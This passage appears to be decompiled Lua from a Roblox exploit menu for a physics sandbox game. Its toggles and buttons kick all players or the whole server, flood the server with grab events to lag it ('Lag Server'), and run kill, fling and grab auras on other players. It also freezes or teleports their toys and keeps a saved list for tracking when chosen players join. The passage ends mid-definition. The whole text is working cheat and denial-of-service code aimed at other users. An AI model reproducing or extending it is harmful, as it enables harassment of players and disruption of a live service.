v675:CreateToggle({
    Name = "Kick all",
    CurrentValue = false,
    Callback = function(p697)
        ka = p697
        while ka do
            local v698, v699, v700 = ipairs(vu1.Players:GetPlayers())
            while true do
                local v701
                v700, v701 = v698(v699, v700)
                if v700 == nil then
                    break
                end
                local v702 = v701.Character
                if vu7.me.Character and (v702 and (vu56(v701.Name) and (vu120(v701.Name) and v701 ~= vu7.me))) then
                    local v703 = v702:FindFirstChild("Humanoid")
                    local vu704 = v702:FindFirstChild("HumanoidRootPart")
                    local v705 = vu7.me.Character:FindFirstChild("Humanoid")
                    if v703 and (vu704 and v705) then
                        local v706 = v705.SeatPart
                        if v706 and v703.Health ~= 0 then
                            local vu707 = v706.Parent
                            if vu707.Name == "CreatureBlobman" then
                                if ik then
                                    vu438(vu707, vu704, "Right", 1)
                                    if ksm then
                                        task.delay(0.035, function()
                                            vu438(vu707, vu704, "Right", 1)
                                        end)
                                    end
                                    if twohand then
                                        vu438(vu707, vu704, "Left", 1)
                                        if ksm then
                                            task.delay(0.035, function()
                                                vu438(vu707, vu704, "Left", 1)
                                            end)
                                        end
                                    end
                                else
                                    vu438(vu707, vu704, "Right", 1)
                                    if ksm then
                                        task.delay(0.035, function()
                                            vu438(vu707, vu704, "Right", 1)
                                        end)
                                    else
                                        task.wait((10 - vu8.ks) / 10)
                                    end
                                    if twohand then
                                        vu438(vu707, vu704, "Left", 1)
                                        if ksm then
                                            task.delay(0.035, function()
                                                vu438(vu707, vu704, "Left", 1)
                                            end)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            task.wait()
        end
    end
})
v675:CreateToggle({
    Name = "Kick all(White List Friends)",
    CurrentValue = false,
    Callback = function(p708)
        ka = p708
        while ka do
            local v709, v710, v711 = ipairs(vu1.Players:GetPlayers())
            while true do
                local v712
                v711, v712 = v709(v710, v711)
                if v711 == nil then
                    break
                end
                local v713 = v712.Character
                if vu7.me.Character and (v713 and (vu56(v712.Name) and (not v712:IsFriendsWith(vu7.me.userId) and vu120(v712.Name)))) then
                    local v714 = v713:FindFirstChild("Humanoid")
                    local vu715 = v713:FindFirstChild("HumanoidRootPart")
                    local v716 = vu7.me.Character:FindFirstChild("Humanoid")
                    if v714 and (vu715 and v716) then
                        local v717 = v716.SeatPart
                        if v717 and v714.Health ~= 0 then
                            local vu718 = v717.Parent
                            if vu718.Name == "CreatureBlobman" then
                                if ik then
                                    vu438(vu718, vu715, "Right", 1)
                                    if ksm then
                                        task.delay(0.035, function()
                                            vu438(vu718, vu715, "Right", 1)
                                        end)
                                    end
                                    if twohand then
                                        vu438(vu718, vu715, "Left", 1)
                                        if ksm then
                                            task.delay(0.035, function()
                                                vu438(vu718, vu715, "Left", 1)
                                            end)
                                        end
                                    end
                                else
                                    vu438(vu718, vu715, "Right", 1)
                                    if ksm then
                                        task.delay(0.035, function()
                                            vu438(vu718, vu715, "Right", 1)
                                        end)
                                    else
                                        task.wait((10 - vu8.ks) / 10)
                                    end
                                    if twohand then
                                        vu438(vu718, vu715, "Left", 1)
                                        if ksm then
                                            task.delay(0.035, function()
                                                vu438(vu718, vu715, "Left", 1)
                                            end)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            task.wait()
        end
    end
})
v675:CreateSection("Basic Functions Settings")
v675:CreateSlider({
    Name = "Kick Speed Slider",
    Range = {
        1,
        10
    },
    Increment = 1,
    Suffix = "",
    CurrentValue = 10,
    Flag = "KickSpeedSlider",
    Callback = function(p719)
        vu8.ks = p719
    end
})
v675:CreateToggle({
    Name = "Max Speed(Bad Ping)",
    CurrentValue = false,
    Flag = "MaxSpeed",
    Callback = function(p720)
        ksm = p720
    end
})
v675:CreateToggle({
    Name = "Invis Kick",
    CurrentValue = false,
    Flag = "InvisKick",
    Callback = function(p721)
        ik = p721
    end
})
v675:CreateToggle({
    Name = "Two Hand Mode",
    CurrentValue = false,
    Flag = "TwoHandMode",
    Callback = function(p722)
        twohand = p722
    end
})
v675:CreateToggle({
    Name = "Ghost Blob",
    CurrentValue = false,
    Flag = "GhostKick",
    Callback = function(p723)
        gk = p723
        while gk and task.wait() do
            local v724 = vu7.me.Character
            if v724 then
                local v725 = v724.Humanoid.SeatPart
                if v725 and (v725.Parent.Name == "CreatureBlobman" and v725:FindFirstChild("WeldConstraint")) then
                    v725.WeldConstraint:Destroy()
                    local v726 = Instance.new("BodyPosition", v725)
                    v726.MaxForce = vu8.V.mhv3
                    v726.Position = v725.Position
                    v725.Transparency = 0
                end
            end
        end
    end
})
v675:CreateSection("Advanced Functions")
v675:CreateToggle({
    Name = "Kick All From All Blobs",
    CurrentValue = false,
    Callback = function(p727)
        kafab = p727
        while kafab and task.wait() do
            local v728, v729, v730 = ipairs(vu1.Players:GetPlayers())
            while true do
                local v731
                v730, v731 = v728(v729, v730)
                if v730 == nil then
                    break
                end
                if v731 ~= vu7.me and (vu56(v731.Name) and vu120(v731.Name)) then
                    local v732 = v731.Character
                    if v732 then
                        local v733 = v732:FindFirstChild("HumanoidRootPart")
                        local v734 = v732.Humanoid.SeatPart
                        if v733 and v732.Humanoid.Health ~= 0 then
                            local v735, v736, v737 = vu1.w:GetDescendants()
                            while true do
                                local v738
                                v737, v738 = v735(v736, v737)
                                if v737 == nil then
                                    break
                                end
                                if v738.Name == "CreatureBlobman" and (v738:FindFirstChild("BlobmanSeatAndOwnerScript") and (v738:FindFirstChild("LeftDetector") and (v738:FindFirstChild("RightDetector") and not v734))) then
                                    vu438(v738, v733, "Left", 1)
                                    task.wait()
                                    vu438(v738, v733, "Right", 1)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
})
v675:CreateButton({
    Name = "Kick SERVER",
    Callback = function()
        if vu7.me.Character then
            local v739 = vu7.me.Character:FindFirstChild("Humanoid")
            local v740 = vu7.me.Character:FindFirstChild("HumanoidRootPart")
            local v741 = v739 and (v740 and v739.SeatPart)
            if v741 then
                local v742 = v741.Parent
                if v742.Name == "CreatureBlobman" then
                    local v743 = v740.CFrame
                    v740.CFrame = v740.CFrame + Vector3.new(0, 900000, 0)
                    local v744, v745, v746 = ipairs(vu1.Players:GetPlayers())
                    while true do
                        local v747
                        v746, v747 = v744(v745, v746)
                        if v746 == nil then
                            break
                        end
                        local v748 = v747.Character
                        if v748 and (vu56(v747.Name) and vu120(v747.Name)) then
                            local v749 = v748:FindFirstChild("Humanoid")
                            local v750 = v748:FindFirstChild("HumanoidRootPart")
                            if v749 and (v750 and v749.Health ~= 0) then
                                vu438(v742, v750, "Right", 1)
                                task.wait()
                            end
                        end
                    end
                    v740.CFrame = v743
                    for _ = 0, 3 do
                        for _ = 0, 135 do
                            vu7.Events.CreateGrabEvent:FireServer(vu7.SL, Sl.CFrame)
                            task.wait()
                        end
                        task.wait(1)
                    end
                end
            end
        end
    end
})
v675:CreateButton({
    Name = "Kick SERVER(White List Friends)",
    Callback = function()
        if vu7.me.Character then
            local v751 = vu7.me.Character:FindFirstChild("Humanoid")
            local v752 = vu7.me.Character:FindFirstChild("HumanoidRootPart")
            local v753 = v751 and (v752 and v751.SeatPart)
            if v753 then
                local v754 = v753.Parent
                if v754.Name == "CreatureBlobman" then
                    local v755 = v752.CFrame
                    v752.CFrame = v752.CFrame + Vector3.new(0, 900000, 0)
                    local v756, v757, v758 = ipairs(vu1.Players:GetPlayers())
                    while true do
                        local v759
                        v758, v759 = v756(v757, v758)
                        if v758 == nil then
                            break
                        end
                        local v760 = v759.Character
                        if v760 and (vu56(v759.Name) and (not v759:IsFriendsWith(vu7.me.userId) and vu120(v759.Name))) then
                            local v761 = v760:FindFirstChild("Humanoid")
                            local v762 = v760:FindFirstChild("HumanoidRootPart")
                            if v761 and (v762 and v761.Health ~= 0) then
                                vu438(v754, v762, "Right", 1)
                                task.wait()
                            end
                        end
                    end
                    v752.CFrame = v755
                    for _ = 0, 3 do
                        for _ = 0, 135 do
                            vu7.Events.CreateGrabEvent:FireServer(vu7.SL, Sl.CFrame)
                            task.wait()
                        end
                        task.wait(1)
                    end
                end
            end
        end
    end
})
local v763 = v491:CreateTab("Lag Menu", 7733765045)
local vu764 = v763:CreateLabel("Your Currently Ping: " .. vu7.me:GetNetworkPing() * 1000)
v763:CreateToggle({
    Name = "Update Ping",
    CurrentValue = false,
    Flag = "UpdatePing",
    Callback = function(p765)
        rthrthrth = p765
        while rthrthrth and task.wait() do
            vu764:Set("Your Currently Ping: " .. vu7.me:GetNetworkPing() * 1000)
        end
    end
})
local vu767 = v763:CreateToggle({
    Name = "Lag Server",
    CurrentValue = false,
    Callback = function(p766)
        laggg = p766
        while laggg do
            for _ = 0, vu8.Lag_Intensity do
                vu7.Events.CreateGrabEvent:FireServer(vu1.w.SpawnLocation, vu1.w.SpawnLocation.CFrame)
            end
            task.wait(1)
        end
    end
})
v763:CreateSlider({
    Name = "Lag Intensity Slider",
    Range = {
        1,
        404
    },
    Increment = 1,
    Suffix = "Create Grab Per Second*10",
    CurrentValue = 105,
    Flag = "LagIntensitySlider",
    Callback = function(p768)
        vu8.Lag_Intensity = p768 * 10
    end
})
v763:CreateKeybind({
    Name = "Lag Server Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "LagServerBind",
    Callback = function(_)
        vu93("Lag Server" .. " is a " .. (not laggg and "En" or "Dis") .. "abled")
        vu767:Set(not laggg)
    end
})
local v769 = v491:CreateTab("Players Menu", 7733674079)
local vu770 = v769:CreateLabel("Kicked: " .. vu8.kickcountc)
v769:CreateSection("Kill")
v769:CreateButton({
    Name = "Kill Player",
    Callback = function()
        local v771, v772, v773 = pairs(vu11.who)
        while true do
            local v774
            v773, v774 = v771(v772, v773)
            if v773 == nil then
                break
            end
            if vu1.Players:FindFirstChild(v774) then
                vu287(vu1.Players[v774])
            end
        end
    end
})
v769:CreateToggle({
    Name = "Loop Kill Player",
    CurrentValue = false,
    Callback = function(p775)
        loopkill = p775
        while loopkill and task.wait() do
            local v776, v777, v778 = pairs(vu11.who)
            while true do
                local v779
                v778, v779 = v776(v777, v778)
                if v778 == nil then
                    break
                end
                if vu1.Players:FindFirstChild(v779) then
                    vu287(vu1.Players[v779])
                end
            end
        end
    end
})
v769:CreateButton({
    Name = "Kill All Players",
    Callback = function()
        local v780, v781, v782 = ipairs(vu1.Players:GetPlayers())
        while true do
            local v783
            v782, v783 = v780(v781, v782)
            if v782 == nil then
                break
            end
            vu287(v783)
        end
    end
})
local vu784 = v491:CreateTab("Players Lists", 7733674079)
local function vu830()
    vu394()
    vu784:CreateSection("Blobman Functions")
    vu784:CreateDropdown({
        Name = "Left Hand List",
        Options = vu12.hui,
        CurrentOption = {
            ""
        },
        MultipleOptions = true,
        Flag = "LeftHandList",
        Callback = function(p785)
            vu11.lplr = {
                "f"
            }
            local v786, v787, v788 = pairs(p785)
            while true do
                local v789
                v788, v789 = v786(v787, v788)
                if v788 == nil then
                    break
                end
                local v790, v791, v792 = pairs(vu12.hui2)
                while true do
                    local v793
                    v792, v793 = v790(v791, v792)
                    if v792 == nil then
                        break
                    end
                    if v789 == v793 then
                        table.insert(vu11.lplr, v792)
                    end
                end
            end
        end
    })
    vu784:CreateDropdown({
        Name = "Right Hand List",
        Options = vu12.hui,
        CurrentOption = {
            ""
        },
        MultipleOptions = true,
        Flag = "RightHandList",
        Callback = function(p794)
            vu11.rplr = {
                "f"
            }
            local v795, v796, v797 = pairs(p794)
            while true do
                local v798
                v797, v798 = v795(v796, v797)
                if v797 == nil then
                    break
                end
                local v799, v800, v801 = pairs(vu12.hui2)
                while true do
                    local v802
                    v801, v802 = v799(v800, v801)
                    if v801 == nil then
                        break
                    end
                    if v798 == v802 then
                        table.insert(vu11.rplr, v801)
                    end
                end
            end
        end
    })
    vu784:CreateSection("Players Menu")
    vu784:CreateDropdown({
        Name = "Kill List",
        Options = vu12.hui,
        CurrentOption = {
            ""
        },
        MultipleOptions = true,
        Flag = "PlayersList",
        Callback = function(p803)
            vu11.who = {}
            local v804, v805, v806 = pairs(p803)
            while true do
                local v807
                v806, v807 = v804(v805, v806)
                if v806 == nil then
                    break
                end
                local v808, v809, v810 = pairs(vu12.hui2)
                while true do
                    local v811
                    v810, v811 = v808(v809, v810)
                    if v810 == nil then
                        break
                    end
                    if v807 == v811 then
                        table.insert(vu11.who, v810)
                    end
                end
            end
        end
    })
    vu784:CreateSection("Others")
    vu784:CreateDropdown({
        Name = "White List",
        Options = vu12.hui,
        CurrentOption = {
            ""
        },
        MultipleOptions = true,
        Flag = "WhiteList",
        Callback = function(p812)
            vu11.whll = {
                "f"
            }
            local v813, v814, v815 = pairs(p812)
            while true do
                local v816
                v815, v816 = v813(v814, v815)
                if v815 == nil then
                    break
                end
                local v817, v818, v819 = pairs(vu12.hui2)
                while true do
                    local v820
                    v819, v820 = v817(v818, v819)
                    if v819 == nil then
                        break
                    end
                    if v816 == v820 then
                        table.insert(vu11.whll, v819)
                    end
                end
            end
        end
    })
    vu784:CreateDropdown({
        Name = "Join Notify(Temp) List",
        Options = vu12.hui,
        CurrentOption = {
            ""
        },
        MultipleOptions = true,
        Flag = "SpyList",
        Callback = function(p821)
            vu12.spylist = {
                "f"
            }
            local v822, v823, v824 = pairs(p821)
            while true do
                local v825
                v824, v825 = v822(v823, v824)
                if v824 == nil then
                    break
                end
                local v826, v827, v828 = pairs(vu12.hui2)
                while true do
                    local v829
                    v828, v829 = v826(v827, v828)
                    if v828 == nil then
                        break
                    end
                    if v825 == v829 then
                        table.insert(vu12.spylist, v828)
                    end
                end
            end
        end
    })
end
local v831 = vu784
local v832 = {
    Name = "Create updating lists",
    Callback = function()
        vu830()
    end
}
vu784.CreateButton(v831, v832)
local v833 = vu784
vu784.CreateSection(v833, "Add/Remove Player to ... List")
local v834 = vu784
vu784.CreateKeybind(v834, {
    Name = "Left Hand",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "Add/RemovePlayertoLeftHand",
    Callback = function(_)
        local v835 = vu7.mouse.target
        local v836, v837, v838 = pairs({
            "Head",
            "Right Arm",
            "Left Arm",
            "Torso",
            "Right Leg",
            "Left Leg",
            "HumanoidRootPart",
            "FirePlayerPart"
        })
        while true do
            local v839
            v838, v839 = v836(v837, v838)
            if v838 == nil then
                break
            end
            if v839 == v835.Name and vu56(v835.Parent.Name) then
                local v840, v841, v842 = pairs(vu11.lplr)
                local v843 = true
                while true do
                    local v844
                    v842, v844 = v840(v841, v842)
                    if v842 == nil then
                        break
                    end
                    if v844 == v835.Parent.Name then
                        table.remove(vu11.lplr, v842)
                        vu93(v844 .. ": Remove from Left Hand List")
                        v843 = false
                        break
                    end
                end
                if v843 then
                    table.insert(vu11.lplr, v835.Parent.Name)
                    vu93(v835.Parent.Name .. ": Add from Left Hand List")
                end
            end
        end
    end
})
local v845 = vu784
vu784.CreateKeybind(v845, {
    Name = "Right Hand",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "Add/RemovePlayertoRightHand",
    Callback = function(_)
        local v846 = vu7.mouse.target
        local v847, v848, v849 = pairs({
            "Head",
            "Right Arm",
            "Left Arm",
            "Torso",
            "Right Leg",
            "Left Leg",
            "HumanoidRootPart",
            "FirePlayerPart"
        })
        while true do
            local v850
            v849, v850 = v847(v848, v849)
            if v849 == nil then
                break
            end
            if v850 == v846.Name and vu56(v846.Parent.Name) then
                local v851, v852, v853 = pairs(vu11.rplr)
                local v854 = true
                while true do
                    local v855
                    v853, v855 = v851(v852, v853)
                    if v853 == nil then
                        break
                    end
                    if v855 == v846.Parent.Name then
                        table.remove(vu11.rplr, v853)
                        vu93(v855 .. ": Remove from Right Hand List")
                        v854 = false
                        break
                    end
                end
                if v854 then
                    table.insert(vu11.rplr, v846.Parent.Name)
                    vu93(v846.Parent.Name .. ": Add from Right Hand List")
                end
            end
        end
    end
})
local v856 = vu784
vu784.CreateKeybind(v856, {
    Name = "Kill",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "Add/RemovePlayertoPlayersList",
    Callback = function(_)
        local v857 = vu7.mouse.target
        local v858, v859, v860 = pairs({
            "Head",
            "Right Arm",
            "Left Arm",
            "Torso",
            "Right Leg",
            "Left Leg",
            "HumanoidRootPart",
            "FirePlayerPart"
        })
        while true do
            local v861
            v860, v861 = v858(v859, v860)
            if v860 == nil then
                break
            end
            if v861 == v857.Name and vu56(v857.Parent.Name) then
                local v862, v863, v864 = pairs(vu11.who)
                local v865 = true
                while true do
                    local v866
                    v864, v866 = v862(v863, v864)
                    if v864 == nil then
                        break
                    end
                    if v866 == v857.Parent.Name then
                        table.remove(vu11.who, v864)
                        vu93(v866 .. ": Remove from Players List")
                        v865 = false
                        break
                    end
                end
                if v865 then
                    table.insert(vu11.who, v857.Parent.Name)
                    vu93(v857.Parent.Name .. ": Add from Players List")
                end
            end
        end
    end
})
local v867 = vu784
vu784.CreateKeybind(v867, {
    Name = "White",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "Add/RemovePlayertoWhiteList",
    Callback = function(_)
        local v868 = vu7.mouse.target
        local v869, v870, v871 = pairs({
            "Head",
            "Right Arm",
            "Left Arm",
            "Torso",
            "Right Leg",
            "Left Leg",
            "HumanoidRootPart",
            "FirePlayerPart"
        })
        while true do
            local v872
            v871, v872 = v869(v870, v871)
            if v871 == nil then
                break
            end
            if v872 == v868.Name and vu56(v868.Parent.Name) then
                local v873, v874, v875 = pairs(vu11.whll)
                local v876 = true
                while true do
                    local v877
                    v875, v877 = v873(v874, v875)
                    if v875 == nil then
                        break
                    end
                    if v877 == v868.Parent.Name then
                        table.remove(vu11.whll, v875)
                        vu93(v877 .. ": Remove from White List")
                        v876 = false
                        break
                    end
                end
                if v876 then
                    table.insert(vu11.whll, v868.Parent.Name)
                    vu93(v868.Parent.Name .. ": Add from White List")
                end
            end
        end
    end
})
local v878 = vu784
vu784.CreateKeybind(v878, {
    Name = "Join Notify(Temp)",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "Add/RemovePlayertoSpyList(Temp)",
    Callback = function(_)
        local v879 = vu7.mouse.target
        local v880, v881, v882 = pairs({
            "Head",
            "Right Arm",
            "Left Arm",
            "Torso",
            "Right Leg",
            "Left Leg",
            "HumanoidRootPart",
            "FirePlayerPart"
        })
        while true do
            local v883
            v882, v883 = v880(v881, v882)
            if v882 == nil then
                break
            end
            if v883 == v879.Name and vu56(v879.Parent.Name) then
                local v884, v885, v886 = pairs(vu12.spylist)
                local v887 = true
                while true do
                    local v888
                    v886, v888 = v884(v885, v886)
                    if v886 == nil then
                        break
                    end
                    if v888 == v879.Parent.Name then
                        table.remove(vu12.spylist, v886)
                        vu93(v888 .. ": Remove from Spy List(Temp)")
                        v887 = false
                        break
                    end
                end
                if v887 then
                    table.insert(vu12.spylist, v879.Parent.Name)
                    vu93(v879.Parent.Name .. ": Add from Spy List(Temp)")
                end
            end
        end
    end
})
local v889 = vu784
vu784.CreateKeybind(v889, {
    Name = "Join Notify(Save)",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "Add/RemovePlayertoSpyList(Save)",
    Callback = function(_)
        local v890 = vu7.mouse.target
        local v891, v892, v893 = pairs({
            "Head",
            "Right Arm",
            "Left Arm",
            "Torso",
            "Right Leg",
            "Left Leg",
            "HumanoidRootPart",
            "FirePlayerPart"
        })
        while true do
            local v894
            v893, v894 = v891(v892, v893)
            if v893 == nil then
                break
            end
            if v894 == v890.Name and vu56(v890.Parent.Name) then
                local v895, v896, v897 = pairs(vu12.sspylist)
                local v898 = true
                local v899 = true
                while true do
                    local v900
                    v897, v900 = v895(v896, v897)
                    if v897 == nil then
                        break
                    end
                    if v900 == v890.Parent.Name then
                        table.remove(vu12.sspylist, v897)
                        vu93(v900 .. ": Remove from Spy List(Save)")
                        writefile("VHS/sspylist.vhs", tostring(vu1.HS:JSONEncode(vu12.sspylist)))
                        v898 = false
                        break
                    end
                end
                local v901, v902, v903 = pairs(vu12.spylist)
                while true do
                    local v904
                    v903, v904 = v901(v902, v903)
                    if v903 == nil then
                        break
                    end
                    if v904 == v890.Parent.Name then
                        if v898 then
                            v899 = false
                        else
                            table.remove(vu12.spylist, v903)
                            vu93(v904 .. ": Remove from Spy List(Temp)")
                            v899 = false
                        end
                        break
                    end
                end
                if v898 then
                    table.insert(vu12.sspylist, v890.Parent.Name)
                    vu93(v890.Parent.Name .. ": Add from Spy List(Save)")
                    writefile("VHS/sspylist.vhs", tostring(vu1.HS:JSONEncode(vu12.sspylist)))
                end
                if v899 then
                    table.insert(vu12.spylist, v890.Parent.Name)
                    vu93(v890.Parent.Name .. ": Add from Spy List(Temp)")
                end
            end
        end
    end
})
vu830()
local v905 = v491:CreateTab("Auras", 7733666258)
v905:CreateSection("Auras")
local vu920 = v905:CreateToggle({
    Name = "Tp To Spawn Aura",
    CurrentValue = false,
    Flag = "TpToSpawnAura",
    Callback = function(p906)
        flingaura = p906
        while flingaura and task.wait() do
            local v907 = vu7.me.Character
            local v908 = v907 and v907:FindFirstChild("Head")
            if v908 then
                local v909, v910, v911 = ipairs(vu1.Players:GetPlayers())
                while true do
                    local v912
                    v911, v912 = v909(v910, v911)
                    if v911 == nil then
                        break
                    end
                    if flingaura and (v912 ~= vu7.me and (vu56(v912.Name) and vu120(v912.Name))) then
                        local v913 = v912.Character
                        if v913 then
                            local v914 = v913:FindFirstChild("Head")
                            if v914 and (v908.Position - v914.Position).Magnitude < vu8.distallaura then
                                task.spawn(function()
                                    vu411(hd)
                                    while not hd:FindFirstChild("PartOwner") do
                                        task.wait()
                                    end
                                    if not hd:FindFirstChild("fpabp") then
                                        local v915 = Instance.new("BodyPosition", hd)
                                        v915.MaxForce = Vector3.new(10000, 10000, 10000)
                                        v915.D = 2000
                                        while hd:FindFirstChild("PartOwner") do
                                            task.wait()
                                        end
                                        v915:Destroy()
                                    end
                                end)
                            end
                        end
                    end
                end
            end
        end
        local v916, v917, v918 = pairs(vu1.w:GetDescendants())
        while true do
            local v919
            v918, v919 = v916(v917, v918)
            if v918 == nil then
                break
            end
            if v919.Name == "fpabp" then
                v919:Destroy()
            end
        end
    end
})
local vu926 = v905:CreateToggle({
    Name = "Fling Aura",
    CurrentValue = false,
    Flag = "FlingAura",
    Callback = function(p921)
        fling2aura = p921
        while fling2aura and task.wait() do
            local v922, v923, v924 = ipairs(Players:GetPlayers())
            while true do
                local v925
                v924, v925 = v922(v923, v924)
                if v924 == nil then
                    break
                end
                if v925 ~= vu7.me and (vu56(v925.Name) and vu120(v925.Name)) then
                    task.spawn(vu294, v925, true)
                end
            end
        end
    end
})
local vu932 = v905:CreateToggle({
    Name = "Kill Aura (void (fast but 65% chance))",
    CurrentValue = false,
    Flag = "KillAura",
    Callback = function(p927)
        killaura = p927
        while killaura and task.wait() do
            local v928, v929, v930 = ipairs(Players:GetPlayers())
            while true do
                local v931
                v930, v931 = v928(v929, v930)
                if v930 == nil then
                    break
                end
                if v931 ~= vu7.me and (vu56(v931.Name) and vu120(v931.Name)) then
                    task.spawn(vu281, v931, true)
                end
            end
        end
    end
})
local vu938 = v905:CreateToggle({
    Name = "Kill Aura (health (slow but 80% chance)",
    CurrentValue = false,
    Flag = "KillAuratwo",
    Callback = function(p933)
        killaura1 = p933
        while killaura1 and task.wait() do
            local v934, v935, v936 = ipairs(Players:GetPlayers())
            while true do
                local v937
                v936, v937 = v934(v935, v936)
                if v936 == nil then
                    break
                end
                if v937 ~= vu7.me and (vu56(v937.Name) and vu120(v937.Name)) then
                    task.spawn(vu287, v937, true)
                end
            end
        end
    end
})
local vu944 = v905:CreateToggle({
    Name = "Grab Aura",
    CurrentValue = false,
    Flag = "GrabAura",
    Callback = function(p939)
        grabaura = p939
        while grabaura and task.wait() do
            local v940, v941, v942 = ipairs(Players:GetPlayers())
            while true do
                local v943
                v942, v943 = v940(v941, v942)
                if v942 == nil then
                    break
                end
                if v943 ~= vu7.me and (vu56(v943.Name) and vu120(v943.Name)) then
                    task.spawn(vu299, v943, true)
                end
            end
        end
    end
})
local vu950 = v905:CreateToggle({
    Name = "Split Aura",
    CurrentValue = false,
    Flag = "SplitAura",
    Callback = function(p945)
        splitaura = p945
        while splitaura and task.wait() do
            local v946, v947, v948 = ipairs(Players:GetPlayers())
            while true do
                local v949
                v948, v949 = v946(v947, v948)
                if v948 == nil then
                    break
                end
                if v949 ~= vu7.me and (vu56(v949.Name) and vu120(v949.Name)) then
                    task.spawn(vu314, v949, true)
                end
            end
        end
    end
})
local vu980 = v905:CreateToggle({
    Name = "Freeze Toy",
    CurrentValue = false,
    Flag = "FreezeToy",
    Callback = function(p951)
        freezetoy = p951
        while true do
            if not (freezetoy and task.wait()) then
                local v952, v953, v954 = pairs(vu1.w:GetDescendants())
                while true do
                    local v955
                    v954, v955 = v952(v953, v954)
                    if v954 == nil then
                        break
                    end
                    if v955.Name == "ftabp" or (v955.Name == "ftabg" or v955.Name == "ftahl") then
                        v955:Destroy()
                    end
                end
                return
            end
            local v956 = vu7.me.Character
            local v957 = v956 and v956:FindFirstChild("HumanoidRootPart")
            if v957 then
                local v958, v959, v960 = ipairs(vu1.Players:GetPlayers())
                while true do
                    local v961
                    v960, v961 = v958(v959, v960)
                    if v960 == nil then
                        break
                    end
                    if v961 ~= vu7.me and vu56(v961.Name) and (vu1.w:FindFirstChild(v961.Name .. "SpawnedInToys") and vu120(v961.Name)) then
                        local v962, v963, v964 = pairs(vu1.w[v961.Name .. "SpawnedInToys"]:GetChildren())
                        while true do
                            local vu965
                            v964, vu965 = v962(v963, v964)
                            if v964 == nil then
                                break
                            end
                            local v966, v967, v968 = pairs(vu965:GetChildren())
                            while true do
                                local vu969
                                v968, vu969 = v966(v967, v968)
                                if v968 == nil then
                                    break
                                end
                                if vu969:IsA("Part") and vu969.CanQuery then
                                    if (vu969.Position - v957.Position).Magnitude >= vu8.distallaura then
                                        if vu969:FindFirstChild("ftabp") then
                                            vu969.ftabp:Destroy()
                                            vu969.ftabg:Destroy()
                                            vu969.ftahl.Value:Destroy()
                                            vu969.ftahl:Destroy()
                                        end
                                    else
                                        task.spawn(function()
                                            if not vu969:FindFirstChild("ftabp") then
                                                local v970 = Instance.new("BodyPosition", vu969)
                                                v970.Position = vu969.Position
                                                v970.D = 100
                                                v970.MaxForce = vu8.V.mhv3
                                                v970.Name = "ftabp"
                                            end
                                            if not vu969:FindFirstChild("ftabg") then
                                                local v971 = Instance.new("BodyGyro", vu969)
                                                v971.CFrame = vu969.CFrame
                                                v971.D = 100
                                                v971.MaxTorque = vu8.V.mhv3
                                                v971.Name = "ftabg"
                                            end
                                            if not vu969:FindFirstChild("ftahl") then
                                                local v972 = Instance.new("Highlight", vu1.w.hls)
                                                v972.Adornee = vu965
                                                v972.OutlineColor = Color3.fromRGB(0, 0, 255)
                                                v972.FillColor = Color3.fromRGB(0, 255, 255)
                                                v972.FillTransparency = 0.5
                                                v972.OutlineTransparency = 0
                                                v972.Name = "ftahl"
                                                local v973 = Instance.new("ObjectValue", vu969)
                                                v973.Value = v972
                                                v973.Name = "ftahl"
                                            end
                                            local v974 = vu965
                                            local v975, v976, v977 = pairs(v974:GetDescendants())
                                            local v978 = false
                                            while true do
                                                local v979
                                                v977, v979 = v975(v976, v977)
                                                if v977 == nil then
                                                    v979 = v978
                                                    break
                                                end
                                                if v979.Name == "PartOwner" then
                                                    break
                                                end
                                            end
                                            if not v979 or v979.Value ~= vu7.myname then
                                                vu411(vu969)
                                                task.wait()
                                            end
                                        end)
                                    end
                                    break
                                end
                            end
                        end
                    end
                end
            end
        end
    end
})
local vu997 = v905:CreateToggle({
    Name = "Tp Toy",
    CurrentValue = false,
    Flag = "DeleteToy",
    Callback = function(p981)
        deletetoy = p981
        while true do
            if not (deletetoy and task.wait()) then
                return
            end
            local v982 = vu7.me.Character
            local vu983 = v982 and v982:FindFirstChild("HumanoidRootPart")
            if vu983 then
                local v984, v985, v986 = ipairs(vu1.Players:GetPlayers())
                while true do
                    local v987
                    v986, v987 = v984(v985, v986)
                    if v986 == nil then
                        break
                    end
                    if v987 ~= vu7.me and vu56(v987.Name) and (vu1.w:FindFirstChild(v987.Name .. "SpawnedInToys") and vu120(v987.Name)) then
                        local v988, v989, v990 = pairs(vu1.w[v987.Name .. "SpawnedInToys"]:GetChildren())
                        while true do
                            local v991
                            v990, v991 = v988(v989, v990)
                            if v990 == nil then
                                break
                            end
                            local v992, v993, v994 = pairs(v991:GetChildren())
                            while true do
                                local vu995
                                v994, vu995 = v992(v993, v994)
                                if v994 == nil then
                                    break
                                end
                                if vu995:IsA("Part") and (vu995.CanQuery and (vu995.Name ~= "Deleting" and vu416(vu995, vu983) < vu8.distallaura)) then
                                    task.spawn(function()
                                        local v996 = vu995.Name
                                        vu995.Name = "Deleting"
                                        while deletetoy and task.wait() do
                                            vu411(vu995)
                                            if vu995:FindFirstChild("PartOwner") and vu995.PartOwner.Value == vu7.myname or (not vu995.Parent or (vu995.Position - vu983.Position).Magnitude > 30) then
                                                break
                                            end
                                        end
                                        vu995.CFrame = vu11.tptoypos
                                        vu995.Name = v996
                                    end)
                                    break
                                end
                            end
                        end
                    end
                    if not vu9.tptoyfs then
                        task.wait()
                    end
                end
            end
        end
    end
})
v905:CreateKeybind({
    Name = "Choice Tp Toy Position",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "ChoiceTpToyPosition",
    Callback = function(_)
        local v998 = vu409()
        if v998 then
            vu11.tptoypos = v998.CFrame
        end
    end
})
v905:CreateToggle({
    Name = "Tp Toy fast speed(bad fps)",
    CurrentValue = false,
    Flag = "TpToyfastspeed",
    Callback = function(p999)
        vu9.tptoyfs = p999
    end
})
v905:CreateSection("Auras Binds")
v905:CreateKeybind({
    Name = "Tp To Spawn Aura Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
